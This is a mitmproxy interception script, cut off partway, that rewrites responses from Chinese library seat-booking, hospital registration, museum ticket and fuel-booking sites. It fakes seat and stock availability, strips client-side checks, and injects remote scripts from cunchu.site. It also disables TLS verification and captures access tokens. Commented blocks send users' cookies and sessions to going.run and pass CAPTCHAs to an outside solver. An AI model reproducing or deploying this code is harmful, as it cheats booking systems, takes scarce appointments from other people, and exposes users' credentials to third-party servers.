from mitmproxy import ctx
import re
import http.client
import json,os
import datetime
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

def nextDay(num):
  temp_date = datetime.datetime.now()
  return (temp_date + datetime.timedelta(days=num)).strftime("%Y-%m-%d")

def nextDaySecurity(num):
  if (datetime.datetime.now().hour < 23 or datetime.datetime.now().minute < 59):
    num -= 1
  temp_date = datetime.datetime.now()
  return (temp_date + datetime.timedelta(days=num)).strftime("%Y-%m-%d")

# <script src="https://cdn.bootcdn.net/ajax/libs/vConsole/3.4.0/vconsole.min.js"></script>
# <script>
#     // init vConsole
#     var vConsole = new VConsole();
# </script>

hackList = [
  # {
  #   "url": "http.*://office.chaoxing.com/data/apps/seat/config",
  #   "hack": [
  #     [
  #       '"reserveBeforeDay":1', 
  #       '"reserveBeforeDay":3'
  #     ]
  #   ]
  # },
  # {
  #   "url": "http.*://office.chaoxing.com/front/apps/seat/select",
  #   "hack": [
  #     [
  #       '提交</p>', 
  #       '''提交</p>
  #       <p class="order_submit" style="position: fixed;bottom: 20%;width: 20vw;height: 30px;line-height: 30px;right: 2%;bottom:13%;z-index:999;" v-if="chosedSeatNum != ''"onclick="owoseet()">保存抢座</p>
  #       <div id="owo3" style="display:none">{{chosedSeatNum}}</div>
  #       '''
  #     ],
  #     [
  #       'return dateArr',
  #       '''
  #       window.roomID = id
  #       return dateArr
  #       '''
  #     ],
  #     [
  #       '</body>',
  #       '''
  #       <script>
  #         let seatList = new Set()
  #         function owoseet (e) {
  #           const userCookie = document.querySelector('#resCookie').innerText
  #           const roomID = window.roomID
  #           seatList.add(document.querySelector('#owo3').innerText)
  #           var usernameS = localStorage.getItem('username')
  #           var sessionS = localStorage.getItem('session')
  #           const sendData = JSON.stringify({
  #             username: usernameS,
  #             session: sessionS,
  #             type: '学习通',
  #             value: {
  #               cookie: userCookie,
  #               roomID: roomID,
  #               seat: Array.from(seatList)
  #             }
  #           })
  #           fetch(`//going.run/userServer?route=updata`, {
  #             method: 'POST',
  #             headers: {
  #               "Content-Type": "application/json"
  #             },
  #             body: sendData
  #           }).then((response) => {return response.json();}).then((res) => {
  #             if (res.err === 0) {
  #               var r=confirm(`您已将${Array.from(seatList).length}个座位加入后台列表，点击确认跳转后台自助抢座，取消可继续添加座位`);
  #               if (r==true) {
  #                 window.location.href = 'http://cunchu.site/work/debug/index.html'
  #               }
  #             } else {
  #               alert(`保存失败: ${res.message}`)
  #             }
  #             outInfo()
  #           })
  #         }
  #       </script>
  #       '''
  #     ],
  #     [
  #       "if (!_this.submitStatus) {",
  #       "if (false) {"
  #     ],
  #   ]
  # },
  # {
  #   "url": ".*/ticketapi.sxhm.com/api/ticket/calendar",
  #   "hack": [
  #     [
  #       '"tp_last_stock_nfree":0', 
  #       '''"tp_last_stock_nfree":100'''
  #     ],
  #     [
  #       '"tp_last_stock":0', 
  #       '''"tp_last_stock":100'''
  #     ],
  #   ]
  # },
  # {
  #   "url": ".*/ticketapi.sxhm.com/api/ticket/detail",
  #   "hack": [
  #     [
  #       '"tp_last_stock":0', 
  #       '''"tp_last_stock":100'''
  #     ],
  #   ]
  # },
  {
    "url": "clientweb/m/ic2/Default.aspx",
    "hack": [
      [
        '</body>', 
        '''
        <link charset="utf-8" rel="stylesheet" href="https://cunchu.site/work/login/mini.css">
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
        <script src="//cunchu.site/work/script/newClient.js" type="text/javascript" charset="UTF-8"></script>
        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
        </body>
        '''
      ],
    ]
  },
  # {
  #   "url": ".*/clientweb/m/a/resvsub.aspx",
  #   "hack": [
  #     [
  #       '<div class="content-block">', 
  #       '''
  #       <div class="" id="xinxi" style="height: 150px;">抢座信息</div>
  #       <script>
  #       function zidong () {
  #         alert('sd')
  #         // alert(app.formToJSON(fm[0]))
  #       }
  #       </script>
  #       '''
  #     ],
  #   ]
  # },
  # {
  #   "url": ".*/ic.ctbu.edu.cn/clientweb/m/ic2/app.js",
  #   "hack": [
  #     [
  #       'if (fm.mustItem())', 
  #       '''pro.confirm = function(text, callBack) {callBack()};
  #       if (!window.cishu) window.cishu = 1
  #       pro.msgBox = function(text) {document.querySelector('#xinxi').innerText = `[${window.cishu++}] ${text}`;}
  #       if (true)'''
  #     ]
  #   ]
  # },
  # {
  #   "url": ".*/ticket.sxhm.com/mm/ticketOrder/selectTicket",
  #   "hack": [
  #     [
  #       '</body>', 
  #       '''
  #       <script src="//cunchu.site/work/script/%E9%99%95%E8%A5%BF%E5%8E%86%E5%8F%B2%E5%8D%9A%E7%89%A9%E9%A6%86.js"></script>
  #       </body>
  #       '''
  #     ],
  #   ]
  # },
  {
    "url": ".*/wechat.laixuanzuo.com/index.php/reserve/index.html|.*/wechat.laixuanzuo.com/index.php/prereserve/index.html",
    "hack": [
      [
        '</body>', 
        '''
        <script src="//cunchu.site/work/script/%E6%9D%A5%E9%80%89%E5%BA%A7.js"></script>
        </body>
        '''
      ],
    ]
  },
  {
    "url": ".*/wechat.v2.traceint.com/index.php/reserve/index.html|.*/wechat.v2.traceint.com/index.php/prereserve/index.html|.*/web.traceint.com/web/index.html",
    "hack": [
      [
        '</body>', 
        '''
        <script src="//web-1251887489.cos.ap-shanghai.myqcloud.com/wqtsg.js?13"></script>
        </body>
        '''
      ],
    ]
  },
  # {
  #   "url": "8da0he3a.sdufe.edu.cn/api.php/spaces_old",
  #   "hack": [
  #     [
  #       '"status":2', 
  #       '''"status": 1'''
  #     ],
  #     [
  #       '"status":0', 
  #       '''"status": 1'''
  #     ],
  #   ]
  # },
  # 货拉拉司机
  {
    "url": "dappweb.huolala.cn/driver-join",
    "hack": [
      [
        '</body>', 
        '<div style="position: absolute;bottom: 2%;right: 2%;width: 100px;background-color: orange;height: 40px;line-height: 40px;"><input id="chkFile" type="file" style="opacity: 0;position: absolute;width: 100%;height: 100%;left: 0;top: 0;" accept="image/*">选择替换图片</div><script src="https://cdn.bootcdn.net/ajax/libs/vConsole/3.4.0/vconsole.min.js"></script><script>var vConsole = new VConsole();</script></body>'
      ]
    ]
  },
  # {
  #   "url": "http://libzw.csu.edu.cn/api.php/space_days/",
  #   "hack": [
  #     [
  #       '}],', 
  #       '},{"day":"' + nextDay(2) + '"}],'
  #     ],
  #   ]
  # },
  # {
  #   "url": "http://www.skalibrary.com/",
  #   "hack": [
  #     [
  #       '</body>', 
  #       '''
  #       <style>
  #       .loading-container, .click-block{
  #         pointer-events: none !important;
  #       }
  #       </style>
  #       </body>'''
  #     ],
  #   ]
  # },
  # {
  #   "url": "/api.php/v3qrtime",
  #   "hack": [
  #     [
  #       '',
  #       '{"status":1,"msg":"\\u670d\\u52a1\\u5668\\u65f6\\u95f4","data":47446499424}'
  #     ]
  #   ]
  # },
  # {
  #   "url": "sdufe.edu.cn/api.php/v3areas",
  #   "hack": [
  #     [
  #       '"isValid":0',
  #       '"isValid":1'
  #     ],
  #     [
  #       '"type":0',
  #       '"type":1'
  #     ],
  #     [
  #       '"TotalCount":0',
  #       '"TotalCount":9999'
  #     ]
  #   ]
  # },
  # 天津大学我去图书馆
  {
    "url": ".*/seatw.lib.tju.edu.cn/index.php/reserve/index.html|.*/seatw.lib.tju.edu.cn/index.php/prereserve/index.html",
    "hack": [
      [
        '</body>', 
        '''
        <script src="//cunchu.site/work/script/%E6%B4%A5%E5%A4%A7.js"></script>
        </body>
        '''
      ],
    ]
  },
  {
    "url": ".*/api.php/v3qrtime",
    "hack": [
      [
        '', 
        '''{"status":1,"msg":"\\u670d\\u52a1\\u5668\\u65f6\\u95f4","data":49793547986}'''
      ],
    ]
  },
  {
    "url": "https://ujnpl.educationgroup.cn/xsgl/stdYy/loadZw",
    "hack": [
      [
        '"src":"1.png"', 
        '"src":"0.png"'
      ],
      [
        '"src":"2.png"', 
        '"src":"0.png"'
      ],
    ]
  },
  # {
  #   "url": "//wxcourse.jxufe.cn/wxlib/wx/data/venueDistributionInfo",
  #   "hack": [
  #     [
  #       '2022-04-09', 
  #       '2022-04-11'
  #     ],
  #   ]
  # },
  {
    "url": "//wxcourse.jxufe.cn/wxlib/wx/data/dateSeatNumStatus",
    "hack": [
      [
        '', 
        '''{"code":1,"success":true,"message":"","result":[{"num":1,"start":"08:00","end":"12:00","allSeatNum":34,"noSeat":0},{"num":2,"start":"12:00","end":"17:00","allSeatNum":34,"noSeat":0},{"num":3,"start":"17:00","end":"23:00","allSeatNum":34,"noSeat":28}]}'''
      ],
    ]
  },
  {
    "url": "http://wx.tolib.cn/mobile/html/seat/seatbook.html",
    "hack": [
      [
        '</body>', 
        '''
        <script src="//cunchu.site/work/script/%E6%B9%96%E5%8D%97%E5%86%9C%E4%B8%9A%E5%A4%A7%E5%AD%A6.js"></script>
        </body>'''
      ],
    ]
  },
  # {
  #   "url": "http://wx.tolib.cn/mobile/html/seat/seatdate.js",
  #   "hack": [
  #     [
  #       'var b=$("#inittime").val();', 
  #       '''
  #       var b=$("#inittime").val();seatdate='2022-04-01';alert(JSON.stringify({
  #         data_type:"seatDate",seatno:seatno,seatname:seatname,seatdate:seatdate,datetime:b
  #       }));'''
  #     ],
  #   ]
  # },
  # 一考即过
  # {
  #   "url": ".*/leosys.cn/hlju/rest/v2/room/layoutByDate",
  #   "hack": [
  #     [
  #       '"local":true', 
  #       '"local":false'
  #     ],
  #   ]
  # },
  # {
  #   "url": ".*/app.papa.com.cn/js/chunk-",
  #   "hack": [
  #     [
  #       't.next=12;', 
  #       '''t.next=8;'''
  #     ],
  #   ]
  # },
  # {
  #   "url": ".*/api.wesais.com/field/wxFieldBuyPlan/getList",
  #   "hack": [
  #     [
  #       '"is_lock":true', 
  #       '''"is_lock":false'''
  #     ],
  #     [
  #       '"is_overdue":true', 
  #       '''"is_overdue":false'''
  #     ],
  #     [
  #       '"lock_status":0', 
  #       '''"lock_status":204'''
  #     ],
  #     [
  #       '"price":0', 
  #       '''"price":"55.00"'''
  #     ],
  #   ]
  # },
  # {
  #   "url": ".*/app.papa.com.cn/js/chunk-",
  #   "hack": [
  #     [
  #       'disabled:!!t.controlTime', 
  #       'disabled:!!false'
  #     ],
  #     [
  #       'if(!this.controlTime)', 
  #       'if(true)'
  #     ]
  #   ]
  # },
  # {
  #   "url": ".*/ClientWeb/pro/ajax/device.aspx",
  #   "hack": [
  #     [
  #       '"state":"undo"', 
  #       '"state":"open"'
  #     ],
  #     [
  #       '"state":null', 
  #       '"state":"open"'
  #     ],
  #     [
  #       '"freeSta":-3',
  #       '"freeSta":0',
  #     ],
  #     [
  #       '"freeSta":-2',
  #       '"freeSta":0',
  #     ],
  #     [
  #       '"freeSta":-1',
  #       '"freeSta":0',
  #     ],
  #     [
  #       '"state":"close"', 
  #       '"state":"open"'
  #     ],
  #     [
  #       '"runsta":6', 
  #       '"runsta":0'
  #     ],
  #     [
  #       '}]}],',
  #       '}],"ts":[]}],'
  #     ]
  #   ]
  # },
  # 盐湖图书馆
  # {
  #   "url": "//yclib.reserve.alb.letoochina.cn/Reserve/getReservationTime",
  #   "hack": [
  #     [
  #       '"available":0', 
  #       '"available":9'
  #     ],
  #   ]
  # },
  # {
  #   "url": "//yclib.reserve.alb.letoochina.cn/Reserve/getDesks",
  #   "hack": [
  #     [
  #       '"reservable":false', 
  #       '"reservable":true'
  #     ],
  #   ]
  # },
  # 车辆预约
  # {
  #   "url": ".*//mmyx.mmsh.sinopec.com/Booking/GetBookingPlanList",
  #   "hack": [
  #     [
  #       '"BookedNum":10', 
  #       '"BookedNum":0'
  #     ],
  #     [
  #       '"BookedNum":11', 
  #       '"BookedNum":0'
  #     ],
  #     [
  #       '"BookedNum":12', 
  #       '"BookedNum":0'
  #     ],
  #   ],
  # },
  # 医院预约
  {
    "url": ".*//wx.whyyy.com/MicroSY/reservegh",
    "hack": [
      [
        '"status":"2"', 
        '"status":"7"'
      ],
      [
        '"status":"6"', 
        '"status":"7"'
      ],
      [
        '"regFlag":-1', 
        '"regFlag":1'
      ]
    ],
  },
  # 安阳图书馆
  # {
  #   "url": "zwqd.ayit.edu.cn/Seatresv/GetResvInfo.asp",
  #   "hack": [
  #     [
  #       '', 
  #       '{"today": "2022-04-08","timelist": [{"date": "2022-04-08","weekday": "\xd0\xc7\xc6\xda\xce\xe5","start": "09:00","end": "22:30","timeslot": ["09:00","22:30"]}]}'
  #     ]
  #   ],
  # },
  # 济南大学
  {
    "url": "/libseat-ibeacon/seatdetail",
    "hack": [
      [
        '</body>', 
        '''<link type="text/css" href="//cunchu.site/work/login/standard.css" rel="stylesheet">
        <script src="//cunchu.site/work/assist/logPanel.js"></script>
        <link type="text/css" href="//cunchu.site/work/login/mini.css" rel="stylesheet">
        <script src="//cunchu.site/work/debug/js/libseat-ibeacon.js" type="text/javascript"></script>
        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
        </body>'''
      ]
    ],
  },
  # 周三强一周
  # {
  #   "url": "//seat.njau.edu.cn/seat/rest/RoomArea/r/yyList",
  #   "hack": [
  #     [
  #       '', 
  #       '{"success":true,"SYSTIME":"20220507222135","message":"\xe6\x88\x90\xe5\x8a\x9f","items":[{"UPDATETIME":"20190102105050553","CYCENDTIME":"20200430","CURRENTCYCENDTIME":"20200331","SIGNSTARTMIN":"30","NUM":"81","CURRENTCYCID":"2d0f3243fe7b45c7839558f10c43238b","YYSTARTTIME":"0800","NEXTCYCID":"a127454c43ae46428d4e814cfe7a57c2","STOPMIN":"30","OPENOBJ":[{"OPENOBJ_NAME":"\xe6\x9c\xac\xe7\xa7\x91\xe7\x94\x9f","OPENOBJID":"0","OPENGRADE":["2015","2016","2017","2018","2019"]},{"OPENOBJ_NAME":"\xe7\xa0\x94\xe7\xa9\xb6\xe7\x94\x9f","OPENOBJID":"1","OPENGRADE":[]},{"OPENOBJ_NAME":"\xe6\x95\x99\xe8\x81\x8c\xe5\xb7\xa5","OPENOBJID":"2","OPENGRADE":[]}],"YYTYPEPARAM":"1","CURRENTCYCSTARTTIME":"20200301","NAME":"\xe9\xa2\x84\xe7\xba\xa62(\xe6\x9c\x88)","ISOPENORDER":"0","SIGNINMIN":"30","CABINETUSE":"1","CYCSTARTTIME":"20200401","YYTYPE":"2","BEFOREHOUR":"1","CANCELMIN":"60","ISCABINET":"1","COUNT":81,"ID":"21e704501b3548f4807a521eb189726e","SIGNSTOPMIN":"30"},{"UPDATETIME":"20210419142135280","CURRENTCYCENDTIME":"20220508","SIGNSTARTMIN":"10","CURRENTCYCID":"5c35ccec5221425bb15fb9eb31a013ac","NEXTCYCID":"b55cdcd56c5f4f71a7977cc700c20612","STOPMIN":"30","OPENOBJ":[{"OPENOBJ_NAME":"\xe6\x9c\xac\xe7\xa7\x91\xe7\x94\x9f","OPENOBJID":"0","OPENGRADE":["15","14","13","12","11"]},{"OPENOBJ_NAME":"\xe7\xa0\x94\xe7\xa9\xb6\xe7\x94\x9f","OPENOBJID":"1","OPENGRADE":[]},{"OPENOBJ_NAME":"\xe6\x95\x99\xe8\x81\x8c\xe5\xb7\xa5","OPENOBJID":"2","OPENGRADE":[]}],"ISOPENORDER":"2","SIGNINMIN":"20","CYCSTARTTIME":"20220516","CLOSEINFO":{"ROOMAREAID":"7149e8ae262844b6a69a15697c22275f","STARTTIME":"20220429","DES":"\xe4\xb8\xb4\xe6\x97\xb6\xe5\x85\xb3\xe9\x97\xad","ENDTIME":"20240729","STATE":"2","ID":"7a9a6355651449a3ab54ef50f60fcb61","CREATETIME":"20220429184214835"},"ID":"7149e8ae262844b6a69a15697c22275f","CYCENDTIME":"20220522","NUM":"1","YYSTARTTIME":"0800","YYTYPEPARAM":"2","NAME":"\xe9\xa2\x84\xe7\xba\xa6\xe5\x91\xa8(\xe6\xb5\x8b\xe8\xaf\x95)","CURRENTCYCSTARTTIME":"20220502","CABINETUSE":"2","YYTYPE":"1","ISCABINET":"1","BEFOREHOUR":"1","CANCELMIN":"10","COUNT":-1,"SIGNSTOPMIN":"50"},{"UPDATETIME":"20190221142142837","CYCENDTIME":"20220522","CURRENTCYCENDTIME":"20220508","SIGNSTARTMIN":"10","NUM":"198","CURRENTCYCID":"8f28d84bd9f94d37864a2d937ef7f3eb","YYSTARTTIME":"0800","NEXTCYCID":"f140434e9636454bbe5103308222106c","STOPMIN":"30","OPENOBJ":[{"OPENOBJ_NAME":"\xe6\x9c\xac\xe7\xa7\x91\xe7\x94\x9f","OPENOBJID":"0","OPENGRADE":[]},{"OPENOBJ_NAME":"\xe7\xa0\x94\xe7\xa9\xb6\xe7\x94\x9f","OPENOBJID":"1","OPENGRADE":[]},{"OPENOBJ_NAME":"\xe6\x95\x99\xe8\x81\x8c\xe5\xb7\xa5","OPENOBJID":"2","OPENGRADE":[]}],"YYTYPEPARAM":"3","NAME":"\xe5\x8d\x97\xe5\x9b\x9b\xe6\xa5\xbc\xe5\xad\xa6\xe4\xb9\xa0\xe5\xae\xa4","CURRENTCYCSTARTTIME":"20220502","ISOPENORDER":"1","SIGNINMIN":"20","CABINETUSE":"2","CYCSTARTTIME":"20220516","YYTYPE":"1","ISCABINET":"1","BEFOREHOUR":"1","CANCELMIN":"10","COUNT":1,"ID":"83d9f722a8ed4a30bdfb99db7c28e978","SIGNSTOPMIN":"50"},{"UPDATETIME":"20190221142127152","CYCENDTIME":"20220522","CURRENTCYCENDTIME":"20220508","SIGNSTARTMIN":"10","NUM":"192","CURRENTCYCID":"68768040a4cf48b896339884eacb4cff","YYSTARTTIME":"0800","NEXTCYCID":"06c17b0509c142a3be26db8d19cb2c21","STOPMIN":"30","OPENOBJ":[{"OPENOBJ_NAME":"\xe6\x9c\xac\xe7\xa7\x91\xe7\x94\x9f","OPENOBJID":"0","OPENGRADE":[]},{"OPENOBJ_NAME":"\xe7\xa0\x94\xe7\xa9\xb6\xe7\x94\x9f","OPENOBJID":"1","OPENGRADE":[]},{"OPENOBJ_NAME":"\xe6\x95\x99\xe8\x81\x8c\xe5\xb7\xa5","OPENOBJID":"2","OPENGRADE":[]}],"YYTYPEPARAM":"3","NAME":"\xe5\x8d\x97\xe4\xba\x94\xe6\xa5\xbc\xe5\xad\xa6\xe4\xb9\xa0\xe5\xae\xa4","CURRENTCYCSTARTTIME":"20220502","ISOPENORDER":"1","SIGNINMIN":"20","CABINETUSE":"2","CYCSTARTTIME":"20220516","YYTYPE":"1","ISCABINET":"1","BEFOREHOUR":"1","CANCELMIN":"10","COUNT":1000,"ID":"fe24cbe0376740d7b1ab950aa2a2481f","SIGNSTOPMIN":"50"}]}'
  #     ]
  #   ],
  # },
  {
    "url": "//seat.njau.edu.cn/seat/rest/RoomArea/r/roomInfo",
    "hack": [
      [
        '"ISFULL":"1"', 
        '"ISFULL":"0"'
      ]
    ],
  },
  {
    "url": "appointment-backend-cdn.dataesb.com/api/appointment/schedule",
    "hack": [
      [
        '"acceptNum":62', 
        '"acceptNum":999'
      ]
    ],
  },
  {
    "url": "https://wxcourse.jxufe.cn/wxlib/wx/data/seatDistribution",
    "hack": [
      [
        '"seat_status":"1"', 
        '"seat_status":"0"'
      ]
    ],
  },
  # 山东财经
  {
    "url": ".*//libst.sdufe.edu.cn/|.*//lxl.sdyu.edu.cn/|.*//www.skalibrary.net|.*/seat.lib.sdu.edu.cn",
    "hack": [
      [
        '</body>', 
        '''
        <script src="http://cunchu.site/work/assist/owoHackUrl.js"></script>
        <link charset="utf-8" rel="stylesheet" href="https://cunchu.site/work/login/mini.css">
        <script src="https://cunchu.site/work/assist/logPanel.js"></script>
        <script src="https://cunchu.site/work/debug/js/sdcj.js"></script>
        
        <script src="https://cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
        <script>
            window.owoHackUrlSend = {
              "api.php/spaces": function (e, myUrl) {
                  console.log(e, myUrl)
                  if (e.indexOf('access_token') >= 0 && document.querySelector('.owo textarea')) {
                    document.querySelector('.owo .send-url').value += myUrl + '@'
                    document.querySelector('.owo textarea').value += e + '@'
                  }
              }
            }
        </script>
        </body>
        '''
      ]
    ],
  },
  # 空间预约
  {
    "url": ".*//libwx.cau.edu.cn/space",
    "hack": [
      [
        '</body>', 
        '''
        <div class="yuyue" onclick="yuyue('600', '840')">预约1</div>
        <div class="yuyue" onclick="yuyue('840', '1080')">预约2</div>
        <div class="yuyue" onclick="yuyue('1080', '1320')">预约3</div>
        <script>
            window.owoType = '中国农业大学空间'
            function nextDay (AddDayCount) {
                var dd = new Date();
                dd.setDate(dd.getDate()+AddDayCount);//获取AddDayCount天后的日期
                var y = dd.getFullYear();
                var m = dd.getMonth()+1;//获取当前月份的日期
                var d = dd.getDate();
                if (m < 10) m = '0' + m
                if (d < 10) d = '0' + d
                return y+"-"+m+"-"+d;
            }
            function yuyue (_stime, _etime) {
              let info = document.querySelector("meta[name=_csrf]").getAttribute('content')
              var myHeaders = new Headers();
              myHeaders.append("Accept", "application/json, text/javascript, */*; q=0.01");
              myHeaders.append("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.20(0x18001431) NetType/WIFI Language/zh_CN");
              myHeaders.append("Referer", "http://libwx.cau.edu.cn/space/discuss/openAppointDetail?roomid=a5215b5d9e5749b39af333b4a26627e3&ustime=1080&uetime=1140&selectDate=" + nextDay(1) + "&ruleId=ee71269cb19d42999ed2ac5063abcfd1&mobile=true&linkSign=discuss");
              myHeaders.append("X-CSRF-TOKEN", info);
              myHeaders.append("Content-Type", "application/json");

              var raw = JSON.stringify({
                "_stime": _stime,
                "_etime": _etime,
                "_roomid": "a5215b5d9e5749b39af333b4a26627e3",
                "_currentday": nextDay(1),
                "UUID": "VEmkgCYM",
                "ruleId": "ee71269cb19d42999ed2ac5063abcfd1",
                "users": "2020311320115 2020311250206",
                "usercount": 2,
                "room_exp": [],
                "_seatno": "0",
                "LOCK": "true"
              });

              var requestOptions = {
                method: 'POST',
                headers: myHeaders,
                body: raw,
              };

              fetch("http://libwx.cau.edu.cn/space/form/dynamic/saveFormLock", requestOptions)
                .then(response => response.text())
                .then(result => alert(result))
                .catch(error => console.log('error', error));
            }
        </script>
        </body>
        '''
      ]
    ],
  },
#   {
#     "url": "http://mmyx.mmsh.sinopec.com/Booking/BookingPlanM",
#     "hack": [
#       [
#         '<script src="../../Scripts/ControlScripts/loading.js"></script>', 
#         '''
# <script src="../../Scripts/ControlScripts/loading.js"></script>
# <script>
# setTimeout(() => {
#     $("#AfterBnt").css("background-color", "#ff4a1f");
#     ISAFTERORDER = true;
#     $("#PerBnt").css("background-color", "#ff4a1f");
#     ISBEFORORDER = true;
# }, 500);
# </script>
#         '''
#       ]
#     ],
#   },
#   {
#     "url": "http://mmyx.mmsh.sinopec.com/Booking/BookingSubmitM",
#     "hack": [
#       [
#         '<button class="bnt" style="height: 1.3rem;" id="ConfirmBnt" onclick="SubmitOrder()">', 
#         '''
# <input type="datetime-local" id="clock" />
# <h3>延迟提交参数(单位秒)</h3>
# <input type="number" id="yanchi" value="0">
# <button class="bnt" style="height: 1.3rem;" id="zhengdian" onclick="tanchu()">
#   整点提交
# </button>
# <button class="bnt" style="height: 1.3rem;" id="jiankong" onclick="jiankong()">
#   监控提交
# </button>

# <script>
# function getYZM (imgEl, callBack) {
#     imgEl.crossOrigin = "anonymous";
#     var canvas = document.createElement("canvas");
#     var ctx = canvas.getContext("2d");  
#     ctx.drawImage(imgEl, 0, 0);
#     var dataURL = canvas.toDataURL('image/png');
#     var base64Data = dataURL.split(',')[1]
    

#     fetch("http://hanshu.run/yzmb", {
#     method: 'POST',
#     body: base64Data
#     }).then(response => response.json())
#     .then(result => {
#       if (callBack) callBack(result.data.result)
#     })
#     .catch(error => console.log('error', error));
# }

# function getQueryVariable(variable, url) {
#   var query = window.location.search.substring(1);
#   if (url) {
#     query = url.split('?')[1]
#   }
#   var vars = query.split("&");
#   for (var i=0;i<vars.length;i++) {
#           var pair = vars[i].split("=");
#           if(pair[0] == variable){return pair[1];}
#   }
#   return(false);
# }

# let checkIndex = 0
# function jiankong () {
#   // getQueryVariable(, resReferer)
#   var requestOptions = {
#     method: 'GET',
#     redirect: 'follow'
#   };

#   fetch(`http://mmyx.mmsh.sinopec.com/Booking/GetBookingPlanList?ProductID=${getQueryVariable('productID', resReferer)}&ShipPlaceID=${getQueryVariable('qYShipPlaceID', resReferer)}&BookingDate=${getQueryVariable('date')}&PreTruckNo=%E7%B2%A4K53676&LadingBillID=${getQueryVariable('Id', resReferer)}`, requestOptions)
#     .then(response => response.json())
#     .then(result => {
#       let next = true
#       result.forEach(element => {
#         if (element.ID == getQueryVariable('PlanID')) {
#           if (element.BookedNum >0) {
#             next = false
#             refreshCode()
#             setTimeout(() => {
#               getYZM(document.querySelector('#ImageCheck'), (yzm) => {
#                 document.querySelector('#InpCode').value = yzm
#                 AddBooking()
#               })
#               window.newAlert = function (text, type, callback) {
#                 if (text.includes('确认') && callback) {
#                   callback()
#                 } else {
#                   alert(text)
#                 }
#               }
#             }, 2000);
#           }
#         }
#       });
#       if (next) {
#         checkIndex++
#         document.querySelector('#jiankong').innerText = `检查次数:${checkIndex}`
#         setTimeout(() => {
#           jiankong()
#         }, 5000);
#       }
#     })
#     .catch(error => console.log('error', error));
# }

# function tanchu() {
#   function getLocalTime(nS) {  
#     return new Date(parseInt(nS)).toLocaleString().replace(/:\d{1,2}$/,' ');  
#   }
#   var yzmCh = false
#   var data = new Date(document.querySelector('#clock').value.replace(/-/g,'/').replace('T',' ')).valueOf()
#   var zhengdian = document.querySelector('#zhengdian')
#   // alert(getLocalTime(data))
#   function tempClock () {
#     var cha = data - Date.now() - parseInt(document.querySelector('#yanchi').value * 1000)
#     if (cha < 15000 && !yzmCh) {
#       yzmCh = true
#       refreshCode()
#       setTimeout(() => {
#         getYZM(document.querySelector('#ImageCheck'), (yzm) => {
#           document.querySelector('#InpCode').value = yzm
#         })
#         window.newAlert = function (text, type, callback) {
#           if (text.includes('确认')) {
#             if(callback) callback()
#             return
#           }
#           alert(text)
#           if (callback) callback()
#         }
#       }, 2000);
#     }
#     if (cha > 200) {
#       zhengdian.innerText = cha
#       setTimeout(() => {
#         tempClock()
#       }, 100);
#     } else {
#       AddBooking()
#     }
#   }
#   tempClock()
# }
# </script>
# <button class="bnt" style="height: 1.3rem;" id="ConfirmBnt" onclick="SubmitOrder()">
#         '''
#       ]
#     ],
#   },
  # iobx
  # {
  #   "url": ".*//www.ibox.art/zh-cn/item",
  #   "hack": [
  #     [
  #       '''</body>''',
  #       '''
  #       <script src="//cunchu.site/work/script/ibox.js" defer></script>
  #       </body>
  #       '''
  #     ]
  #   ]
  # },
  # {
  #   "url": "wx.hzmbus.com/webapi/manage/query.book.info.data",
  #   "hack": [
  #     [
  #       '''"maxPeople":0''',
  #       '''"maxPeople":10'''
  #     ],
  #     [
  #       '''"maxBookDate":"2022-03-06"''',
  #       '''"maxBookDate":"2022-12-06"'''
  #     ]
  #   ]
  # },
  
  # 石景山图书馆
  # {
  #   "url": "https://e.sjsmlxcx.xyz/yuyue/book",
  #   "hack": [
  #     [
  #       '''<button class="submit">提交申请</button>''',
  #       '''<button class="submit">提交申请</button><div class="submit-2" onclick="autoSend()" style="margin-top: 10px;">自动抢下一天</div>
  #       <script type="text/javascript">
  #       var owoIndex = 1
  #       function autoSend() {
  #         var requestOptions = {
  #           method: 'GET',
  #           redirect: 'follow'
  #         };

  #         fetch("https://e.sjsmlxcx.xyz/yuyue/GetSceneList?id=2", requestOptions)
  #           .then(response => response.json())
  #           .then(result => {
  #             result.content.Lists.forEach(element => {
  #               let key = element.Secent[0]
  #               if (key.PeopleNumber != key.TicketNumber) {
  #                 tijiao2(key.Id)
  #               }
  #             });
  #             document.querySelector('.submit-2').innerText = `自动抢下一天[${owoIndex++}]`
  #             setTimeout(() => {
  #               autoSend()
  #             }, 600);
  #           })
  #           .catch(error => console.log('error', error))
  #       function tijiao2 (SceneId) {
  #         var userCard=$("input[name='idCard']").val();
  #         var yearBirth = userCard.substring(6,10);
  #         var monthBirth = userCard.substring(10,12);
  #         var dayBirth = userCard.substring(12,14);
  #         var myDate = new Date();
  #         var monthNow = myDate.getMonth() + 1;
  #         var dayNow = myDate.getDay();
  #         var age = myDate.getFullYear() - yearBirth;
  #         if(monthNow < monthBirth || (monthNow == monthBirth && dayNow < dayBirth)){
  #             age--;
  #         };
  #         console.log(age);

  #         // if(age<13){
  #         //     alert("谢绝13岁以下儿童进馆");
  #         //     return;
  #         // }

  #         var CardNumber0 = $('input[name="idCard"]').val();
  #         if($("input[name='idCard']").val()==""){
  #             alert('请检查您的证件号是否填写');
  #             return;
  #         }
  #         if($('select[name="type"]').val()=="1"){
  #             if (!(/^[1-9]\d{7}((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])\d{3}$|^[1-9]\d{5}[1-9]\d{3}((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])\d{3}([0-9]|X|x)$/.test(CardNumber0))) {
  #                 alert('请检查您的居民身份证号是否正确');
  #                 return;
  #             }
  #         }
  #         if($('select[name="type"]').val()=="2"){
  #             if (CardNumber0.length < 5) {
  #                 alert('请检查您的港澳台身份证/护照/外国人永居证是否正确');
  #                 return;
  #             }   
  #         }
  #         var data={
  #             Name:$("input[name='names']").val(),
  #             IdType:$('select[name="type"]').val(),
  #             IdNumber:$("input[name='idCard']").val(),
  #             Mobile:$(".tel").html(),
  #             SceneId:SceneId,
  #             FacilitiesId: 4,
  #             SpaceId: 2,
  #             ExtMember:[]
  #         }
  #         $.ajax({
  #             url: '/yuyue/SubmitBook',
  #             type: 'POST',
  #             contentType: "application/json",
  #             dataType: "json",
